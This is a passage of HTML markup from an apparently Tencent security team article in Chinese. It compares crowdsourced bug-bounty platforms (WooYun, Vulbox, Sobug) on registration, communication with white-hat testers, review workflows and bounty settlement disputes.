24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">再来看看与白帽子的沟通便捷性。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">乌云众测主要通过评论的方式与参与的白帽子沟通，也无私信的方式，沟通成本稍高。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">这里再啰嗦一下供参考。因为TSRC在运营腾讯漏洞报告平台的过程中发现，大部分跟白帽子的分歧都是可以通过及时沟通解决的，所以TSRC特别重视跟白帽子的沟通，除了提供私信的方式之外，TSRC还在每个漏洞报告里都提供漏洞处理人员、当日值班工作人员、白帽子的一键QQ联系按钮，方便及时沟通解决问题，建议其它平台也可以参考之。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">接下来的阶段就是结算奖金。按最初的与乌云的商定协议是跟TSRC平台的奖励机制保持一致，TSRC也是为了维持两边的白帽子利益的公平性，所以评分完全参考TSRC官网PDF标准，安全币和人民币以1:4的比例进行兑换，重点鼓励高质量漏洞（额外1~10万的奖励），对此双方均表示同意。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>最后在与乌云众测结算奖金时，双方出现了意见分歧：乌云认为低危问题至少要奖励1000元，中危问题至少要奖励5000元；而我们则希望秉承&ldquo;公平公正公开&rdquo;的原则，坚持按照已确定的TSRC标准评定（也就是&ldquo;程序正义&rdquo;。只有先做到&ldquo;程序正义&rdquo;，才会有&ldquo;结果正义&rdquo;）。因此，建议厂商在参与安全众测前，充分沟通好相关事宜并签定书面合同，避免后期的分歧。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>值得肯定的是，虽然出现了分歧，但乌云众测方面决定按照自有规则补齐白帽子奖金的差额。我们可以看到，乌云对白帽子利益非常重视，甚至愿意牺牲自己的利益来弥补这里的损失。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>最后，乌云众测上发现的漏洞细节不会对外公开。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">三）漏洞盒子</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6662" tppabs="http://security.tencent.com/uploadimg_dir/201407/cf651db3fb519bd14bf683b14e215d3d.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">4&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子宣传图</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>漏洞盒子（<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('https://www.vulbox.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='https://www.vulbox.com/'" tppabs="https://www.vulbox.com/">https://www.vulbox.com</a>&nbsp;）是国内著名的安全媒体Freebuf（&nbsp;<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://www.freebuf.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.freebuf.com/'" tppabs="http://www.freebuf.com/">http://www.freebuf.com</a>）推出的漏洞发现与处理平台。它依托Freebuf，影响力和能力也非常强大，漏洞盒子也是目前唯一有国外白帽子的众包安全测试平台。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">依然从帐号注册谈起。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>厂商需要先在平台上注册，然后由漏洞盒子发送激活邮件到厂商的注册邮箱，点击激活后才可使用，这里的注册流程相对来说要完善一些。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子的站点是走HTTPS加密协议的，厂商再也不担心传输的安全啦。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6661" tppabs="http://security.tencent.com/uploadimg_dir/201407/1204f80663f62af5c101b96eebe3cfac.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">5&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子的HTTPS协议</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">再来看用户体验。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">当有白帽子提交漏洞后，除了会发送站点消息外，还会另外向注册邮箱发送提醒邮件，相对比较人性化。因为多数情况下，厂商无法一直都盯着众测站点刷新，邮件提醒可以有效地帮助厂商及时处理漏洞，也更节省大家的时间成本。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style="border: 0px; max-width: 854px" src="read-1.php-6660" tppabs="http://security.tencent.com/uploadimg_dir/201407/3a008fb45ce89c7d3f9638fb37ae11e6.png" border="0" /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">6&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子的提醒邮件</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">在漏洞盒子上面，厂商可以清晰地看到本次参与众测的白帽子们，一来方便厂商了解测试人员的情况，二来如果遇到高质量漏洞，还可以挖挖人，平台也不失为一个好的&ldquo;人才中介所&rdquo;。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">&nbsp;<img style="border: 0px; max-width: 854px" src="read-1.php-6659" tppabs="http://security.tencent.com/uploadimg_dir/201407/ab4644ababd77a2843f89edb61b4bf14.png" border="0" /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图</span><span style="font-family: 微软雅黑, sans-serif">7&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子的参与白帽子们</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">不过对于白帽子的沟通方式上，仍然以评论功能为主，不方便。在此不再赘述。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子上还有国外白帽子参与测试，提交的报告内容全是英文的，最初我们以为只是香港等地区的白帽子，后来证实确实是老外。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">漏洞盒子官方对于漏洞的审核还不够严格，基本也是扮演&ldquo;中介&rdquo;的角色。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子上面有单独的&ldquo;我的漏洞&rdquo;查看页面，方便厂商了解整体的漏洞情况，以及各个漏洞的审核进度，这点做得不错。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-1.php-6657" tppabs="http://security.tencent.com/uploadimg_dir/201407/23f2348c907ef19c47b7e335ce7ec617.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图8 漏洞盒子的&ldquo;我的漏洞&rdquo;页面</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">厂商在漏洞盒子上确认漏洞时，漏洞等级完全由报告者指定，厂商必须在关闭漏洞（相当于漏洞修复）后才能设置等级及赏金，然后由漏洞盒子官方先付钱给白帽子。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>在这个过程会有一个问题，就是确认漏洞后，白帽子一般会急于知道赏金额度，而厂商修复漏洞需要一定时间。此时白帽子可能会不停地催促询问漏洞盒子官方，而官方又来催厂商，导致相互磨耗双方的人力和时间。因此建议厂商在确认漏洞的时候，可以设置等级以及赏金额度，这时赏金没有给到白帽子（仅做告知作用），在厂商点击&ldquo;关闭漏洞&rdquo;（建议改成&ldquo;漏洞已修复&rdquo;）后，最终钱才会给到白帽子。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">最后又到了结算时间。由于最后的赏金金额问题，双方又产生了分歧，原因同乌云众测。建议仍然是项目进行前双方在合同中明确规定各种情况，避免分歧。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">另外，漏洞盒子的众测模式还有点不一样，它有个概念叫&ldquo;常驻&rdquo;，意思是厂商可以常驻平台，让白帽子长期进行测试&mdash;&mdash;也就是项目没有结束期限。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">漏洞盒子上的漏洞细节默认不公开，但如果白帽子要求公开，厂商也同意，漏洞细节就可以公开。我们想公开金额争议较大的一个漏洞，但是却发现厂商没法主动公开，需要去让白帽子发起。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">四）Sobug白帽众测</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6653" tppabs="http://security.tencent.com/uploadimg_dir/201407/92f879c9d0b5629b3243a6e58d6726a5.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图9 Sobug众测&nbsp; Logo</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>Sobug</span><span style="font-family: 微软雅黑, sans-serif">白帽众测平台（&nbsp;</span><a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://www.sobug.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.sobug.com/'" tppabs="http://www.sobug.com/"><span style="font-family: 微软雅黑, sans-serif">http://www.Sobug.com</span></a><span style="font-family: 微软雅黑, sans-serif">）是新成立不久的团队，创始人是前腾讯员工。由于创立不久，网站稳定性稍逊一筹，整体评价在流程和体验上会有一些小问题，不过团队整体迭代速度很快，出现的问题都会在很短的时间内解决。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>在Sobug上注册帐号，也是由厂商通过邮箱进行注册，以鉴别厂商身份的真伪，这点跟漏洞盒子的方式类似。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>Sobug</span><span style="font-family: 微软雅黑, sans-serif">网站也是走HTTPS加密传输通道，不赘述。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>在三大安全众测平台中，目前只有Sobug对白帽子提交的漏洞的真实性有作一定的审核。这个用户体验做的不错，对于一些专业技术实力不够或者人力匮乏的厂商，帮助应该非常大。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><div style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6651" tppabs="http://security.tencent.com/uploadimg_dir/201407/7cf0d9d6a45079cc207364bf65858b9f.png" border="0" /></span></div><span style="font-size: 14px; line-height: 24px; font-family: 微软雅黑, sans-serif; color: #333333"><br /></span><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图10 Sobug的漏洞审核与点评</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>在Sobug上有提供评论功能，但TSRC在使用时未显示出来，经过沟通，确认是平台bug，看来平台还不太稳定。同时由于Sobug的评论不允许换行，点击确认就自动发表评论，导致连Sobug官方自己都多次重复发表评论，着实有待改进。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img style="border: 0px; max-width: 854px" src="read-2.php-6650" tppabs="http://security.tencent.com/uploadimg_dir/201407/932bb7dcf2b3d63eaad21a0ff8288c5c.png" border="0" /><br /><br /></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px; text-align: center"><span style="font-family: 微软雅黑, sans-serif">图11 Sobug的评论bug</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>TSRC</span><span style="font-family: 微软雅黑, sans-serif">在Sobug上处理漏洞时发现，上面是无法忽略漏洞的，只有&ldquo;确认&rdquo;跟&ldquo;退回&rdquo;两个选项。即使你点了&ldquo;退回&rdquo;也只是把状态由&ldquo;待审核&rdquo;转变为&ldquo;待确认&rdquo;，然后只能继续选择&ldquo;确认&rdquo;或&ldquo;退回&rdquo;，就这样死循环着，我们已经不知道该如何继续操作了。而且在下一次审核时，因为被标记为&ldquo;待确认&rdquo;，导致审核者容易再重复审核。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>从上面几点可以看出，Sobug平台的各项功能还不够稳定和完善，期待后续有更多人性化地改进。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>在与白帽子沟通方面，Sobug也是主要通过评论沟通，沟通成本稍高，同样不再赘述。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>又到了结算时间， Sobug平台还没有出什么争议。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 